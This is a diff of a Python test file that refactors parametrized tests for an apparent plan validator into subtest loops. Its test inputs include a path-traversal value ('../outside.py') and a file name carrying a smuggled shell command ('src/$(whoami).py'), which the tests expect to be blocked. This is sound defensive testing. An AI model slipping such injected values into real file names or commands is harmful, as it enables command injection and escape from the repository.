     plans_dir = repo / "daydream_plans"
@@ -1519,36 +1767,54 @@ def test_existing_coverage_command_is_scoped_to_read_only_test_evidence(repo: Pa
     assert "`uv run pytest tests/test_catalog.py`" in rendered
     assert "Retargeted by the host" not in rendered.partition("### Existing coverage")[2]
 
-@pytest.mark.parametrize("replacement",
-    [
-        "def test_list_catalog_returns_items_extra():\n    assert list_catalog()\n",
-        "# def test_list_catalog_returns_items():\nVALUE = 1\n",
-        'DESCRIPTION = "def test_list_catalog_returns_items():"\n',
-    ], ids=("longer-symbol", "comment", "string"),
-)
-def test_existing_coverage_requires_an_exact_test_declaration(repo: Path, replacement: str,) -> None:
+def _case_existing_coverage_requires_an_exact_test_declaration(repo: Path, replacement: str) -> None:
     (repo / "tests/test_catalog.py").write_text(replacement, encoding="utf-8")
     plan = _authored_plan()
     _use_existing_catalog_coverage(plan)
     issues = _issues(repo, plan)
     assert [render_issue(issue) for issue in issues] == ["EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/0"]
 
-@pytest.mark.parametrize(("path", "symbol", "source"),
-    [("apps/catalog/api.py", "list_catalog",
-            "def list_catalog():\n    return []\n",
-        ),
-        ("tests/test_catalog.py", "catalog_helper",
-            "def catalog_helper():\n    return []\n",
-        ),
-    ], ids=("source-function", "test-helper"),
-)
-def test_existing_coverage_rejects_non_test_python_functions(repo: Path, path: str, symbol: str, source: str,) -> None:
+
+def test_existing_coverage_requires_an_exact_test_declaration(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = [
+        "def test_list_catalog_returns_items_extra():\n    assert list_catalog()\n",
+        "# def test_list_catalog_returns_items():\nVALUE = 1\n",
+        'DESCRIPTION = "def test_list_catalog_returns_items():"\n',
+    ]
+    case_index = 0
+    for replacement in cases_0:
+        with subtests.test(replacement=replacement), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_existing_coverage_requires_an_exact_test_declaration(repo=repo, replacement=replacement)
+
+
+def _case_existing_coverage_rejects_non_test_python_functions(repo: Path, path: str, symbol: str, source: str) -> None:
     (repo / path).write_text(source, encoding="utf-8")
     plan = _authored_plan()
     _use_existing_catalog_coverage(plan)
     plan["test_plan"]["existing_coverage"][0].update(path=path, symbol=symbol)
     issues = _issues(repo, plan)
     assert [render_issue(issue) for issue in issues] == ["EXISTING_COVERAGE_INVALID@/test_plan/existing_coverage/0"]
+
+
+def test_existing_coverage_rejects_non_test_python_functions(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[tuple[str, str, str]] = [
+        ("apps/catalog/api.py", "list_catalog", "def list_catalog():\n    return []\n"),
+        ("tests/test_catalog.py", "catalog_helper", "def catalog_helper():\n    return []\n"),
+    ]
+    case_index = 0
+    for path, symbol, source in cases_0:
+        with (
+            subtests.test(path=path, symbol=symbol, source=source),
+            isolated_case(tmp_path, str(case_index)) as scenario,
+        ):
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_existing_coverage_rejects_non_test_python_functions(
+                repo=repo, path=path, symbol=symbol, source=source
+            )
+
 
 def test_deletion_only_plan_can_omit_test_code_when_non_behavioral(repo: Path, head_sha: str,) -> None:
     plan = _authored_plan(title="Delete obsolete catalog documentation")
@@ -1679,11 +1945,8 @@ def test_plan_must_cover_every_expected_aggregate_fingerprint(repo: Path, head_s
     rendered = _render_assembled_plan(assembled, head_sha)
     assert "**Covered finding fingerprints**: `fp-fix-n-plus-one`, `fp-repeated-tests`" in rendered
 
-@pytest.mark.parametrize(
-    ("location", "pointer"), [("step", "/steps/0/changes/0/path"), ("test", "/test_plan/cases/0/test_file"),],
-)
-def test_undeclared_escaping_path_is_blocked_and_never_declared_in_scope(
-    repo: Path, location: str, pointer: str, tmp_path: Path,
+def _case_undeclared_escaping_path_is_blocked_and_never_declared_in_scope(
+    repo: Path, location: str, pointer: str, tmp_path: Path
 ) -> None:
     outside = tmp_path / "outside"
     outside.mkdir()
@@ -1702,6 +1965,21 @@ def test_undeclared_escaping_path_is_blocked_and_never_declared_in_scope(
     # path would have been re-reported from the scope list the host wrote it to.
     assert f"PATH_OUTSIDE_REPOSITORY@{pointer}" in {render_issue(issue) for issue in issues}
     assert not [issue for issue in issues if issue.pointer.startswith("/scope/")]
+
+
+def test_undeclared_escaping_path_is_blocked_and_never_declared_in_scope(
+    tmp_path: Path, subtests: pytest.Subtests
+) -> None:
+    cases_0: Sequence[tuple[str, str]] = [("step", "/steps/0/changes/0/path"), ("test", "/test_plan/cases/0/test_file")]
+    case_index = 0
+    for location, pointer in cases_0:
+        with subtests.test(location=location, pointer=pointer), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_undeclared_escaping_path_is_blocked_and_never_declared_in_scope(
+                repo=repo, location=location, pointer=pointer, tmp_path=scenario.tmp_path
+            )
+
 
 def test_undeclared_malformed_step_path_is_blocked_and_never_declared_in_scope(repo: Path) -> None:
     plan = _authored_plan()
@@ -1774,8 +2052,7 @@ def test_deleted_stop_path_is_declared_out_of_scope_without_touching_disk(repo: 
     assert not (repo / deleted).exists()
     assert assembled["stop_conditions"][3]["related_paths"] == [deleted]
 
-@pytest.mark.parametrize("path", ["../outside.py", "src/$(whoami).py"])
-def test_malformed_stop_path_stays_blocked_and_is_never_declared(repo: Path, path: str) -> None:
+def _case_malformed_stop_path_stays_blocked_and_is_never_declared(repo: Path, path: str) -> None:
     plan = _authored_plan()
     plan["false_assumption"]["related_paths"] = [path]
     issues = _issues(repo, plan)
@@ -1783,6 +2060,17 @@ def test_malformed_stop_path_stays_blocked_and_is_never_declared(repo: Path, pat
     assert plan["scope"]["out_of_scope_paths"] == [
         {"path": "README.md", "reason": "Catalog batching does not change user documentation.",}
     ]
+
+
+def test_malformed_stop_path_stays_blocked_and_is_never_declared(tmp_path: Path, subtests: pytest.Subtests) -> None:
+    cases_0: Sequence[str] = ["../outside.py", "src/$(whoami).py"]
+    case_index = 0
+    for path in cases_0:
+        with subtests.test(path=path), isolated_case(tmp_path, str(case_index)) as scenario:
+            case_index += 1
+            repo, current_head = _repo(scenario.tmp_path)
+            _case_malformed_stop_path_stays_blocked_and_is_never_declared(repo=repo, path=path)
+
 
 def test_out_of_repository_stop_path_stays_blocked_and_is_never_declared(repo: Path, tmp_path: Path,) -> None:
     outside = tmp_path / "outside"
